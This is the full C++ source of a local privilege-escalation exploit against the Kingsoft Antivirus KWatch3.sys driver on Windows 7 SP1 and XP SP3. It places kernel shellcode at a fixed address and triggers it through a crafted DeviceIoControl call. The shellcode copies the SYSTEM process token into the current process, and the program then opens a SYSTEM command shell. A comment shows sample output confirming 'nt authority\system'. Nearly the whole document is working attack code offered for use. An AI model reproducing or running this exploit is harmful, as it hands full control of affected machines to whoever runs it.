//
// Exploit for Kingsoft Antivirus KWatch Driver (KWatch3.sys)
// Target File Version: 2009.3.17.77
// Affected Product: Kingsoft Internet Security 9 Plus
//

/*
------------------------------------------------------------------------------
Shellcode is located at 7E7E7E7E.
The device was opened as 00000020.
Shellcode was executed.
The SYSTEM shell was launched.
This process will be suspended for ever.

------------------------------------------------------------------------------
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user\Desktop>whoami
nt authority\system
------------------------------------------------------------------------------
*/
#include <iostream>
#include <string>
#include <vector>
#include <memory>

#include <tchar.h>
#include <Windows.h>
#include <WinIoCtl.h>


namespace {


// Indicates if privilege of this process has alredy been escaleted.
volatile bool g_exploited = false;

static const int BYTES_OF_SHELLCODE = 100;


//
// Prototypes
//
bool SendExploitData();

DWORD WINAPI WaitAndLauncCMDThread(
    __in void* Context);

bool LaunchCMD();

void SuspendProcess();


//
// Implementations
//


template<class T, class D> inline
std::unique_ptr<T, D> make_unique_ptr(
    __in T* p,
    __in D d = D())
{
    return std::unique_ptr<T, D>(p, std::forward<D>(d));
}


// Defines for XP SP3
#define WINXP_KTHREAD_OFFSET    0x124
#define WINXP_EPROCESS_OFFSET   0x44
#define WINXP_FLINK_OFFSET      0x88
#define WINXP_PID_OFFSET        0x84
#define WINXP_TOKEN_OFFSET      0xc8
#define WINXP_SYS_PID           4

// Defines for 7 SP1
#define WIN_7_KTHREAD_OFFSET    0x124
#define WIN_7_EPROCESS_OFFSET   0x50
#define WIN_7_FLINK_OFFSET      0xb8
#define WIN_7_PID_OFFSET        0xb4
#define WIN_7_TOKEN_OFFSET      0xf8
#define WIN_7_SYS_PID           4

// Target settings
#define WIN_KTHREAD_OFFSET    WIN_7_KTHREAD_OFFSET      // nt!_KPCR.PcrbData.CurrentThread
#define WIN_EPROCESS_OFFSET   WIN_7_EPROCESS_OFFSET     // nt!_KTHREAD.ApcState.Process
#define WIN_FLINK_OFFSET      WIN_7_FLINK_OFFSET        // nt!_EPROCESS.ActiveProcessLinks.Flink
#define WIN_PID_OFFSET        WIN_7_PID_OFFSET          // nt!_EPROCESS.UniqueProcessId
#define WIN_TOKEN_OFFSET      WIN_7_TOKEN_OFFSET        // nt!_EPROCESS.Token
#define WIN_SYS_PID           WIN_7_SYS_PID             // PID Process SYSTEM

// Shellcode that exchanges a token of a current process with
// a token of SYSTEM process in order to obtain SYSTEM privilege.
__declspec (naked) static
void ShellCode()
{__asm{
    //int 3
    pushad

    mov eax, fs:[WIN_KTHREAD_OFFSET]      // eax <= Current._KTHREAD
    mov eax, [eax + WIN_EPROCESS_OFFSET]  // eax <= Current._EPROCESS
    push eax

    mov ecx, WIN_SYS_PID

SearchSystemProcess:
    mov eax, [eax + WIN_FLINK_OFFSET]     // eax <= _EPROCESS.ActiveProcessLinks.Flink
    sub eax, WIN_FLINK_OFFSET             // eax <= _EPROCESS of the next process
    cmp [eax + WIN_PID_OFFSET], ecx       // if (UniqueProcessId != SYS_PID)
    jne SearchSystemProcess               //      jmp SearchSystemProcess
    mov edi, [eax + WIN_TOKEN_OFFSET]     // edi <= Token of process with SYS_PID
    and edi, 0fffffff8h                   // Must be aligned by 8

    pop eax                               // eax <= Current._EPROCESS
    mov [eax + WIN_TOKEN_OFFSET], edi     // Replace the token of the process to escalate
                                          // by the token of the process with SYS_PID

    popad
    //int 3
    mov g_exploited, 1

EndlessLoop:
    pause
    jmp EndlessLoop
    int 3
}}


// Send exploit data to the driver
bool SendExploitData()
{
    const auto deviceHandle = make_unique_ptr(::CreateFile(
        TEXT("\\\\.\\kwatch3"),
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr), ::CloseHandle);
    if (deviceHandle.get() == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    printf("The device was opened as %p.\n", deviceHandle.get());

    std::vector<unsigned char> exploit_kwatch3(0x44, 0x7e);
    DWORD returned = 0;
    const auto succeed = ::DeviceIoControl(
        deviceHandle.get(), 0x80030004,
        exploit_kwatch3.data(), exploit_kwatch3.size(),
        nullptr, 0,
        &returned, nullptr);

    return !!succeed;
}


DWORD WINAPI WaitAndLauncCMDThread(
    __in void* Context)
{
    UNREFERENCED_PARAMETER(Context);

    while (!g_exploited)
    {
        ::Sleep(100);
    }
    printf("Shellcode was executed.\n");

    if (!LaunchCMD())
    {
        return 1;
    }
    printf("The SYSTEM shell was launched.\n");
    printf("This process will be suspended for ever.\n");
    SuspendProcess();
    return 0;
}


bool LaunchCMD()
{
    TCHAR cmd[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(si) };
    if (!::CreateProcess(cmd, cmd, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi))
    {
        return false;
    }

    ::CloseHandle(pi.hThread);
    ::CloseHandle(pi.hProcess);
    return true;
}


void SuspendProcess()
{
    typedef LONG (NTAPI*NtSuspendProcessType)(HANDLE ProcessHandle);
    auto ntSuspendProcess = reinterpret_cast<NtSuspendProcessType>(
        ::GetProcAddress(::GetModuleHandle(TEXT("ntdll")), "NtSuspendProcess"));

    ntSuspendProcess(::GetCurrentProcess());
}


} // end of {unnamed}


int _tmain()
{
    // Create a support thread
    auto thread = make_unique_ptr(::CreateThread(
        nullptr, 0,
        &WaitAndLauncCMDThread, nullptr,
        0, nullptr), ::CloseHandle);
    if (!thread)
    {
        return 1;
    }

    // Initialize shellcode
    auto shellcodeSpace = make_unique_ptr(::VirtualAlloc(
        reinterpret_cast<void*>(0x7e7e7e7e), 0x1000,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE),
        [](void* p){ ::VirtualFree(p, 0, MEM_RELEASE); });
    if (!shellcodeSpace)
    {
        return 1;
    }
    memset(shellcodeSpace.get(), 0xCC, 0x1000);
    auto shellcode = reinterpret_cast<unsigned char*>(0x7e7e7e7e);
    memcpy(shellcode, &ShellCode, BYTES_OF_SHELLCODE);
    printf("Shellcode is located at %p.\n", shellcode);

    // exploit
    if (!SendExploitData())
    {
        return 1;
    }
    return 0;
}
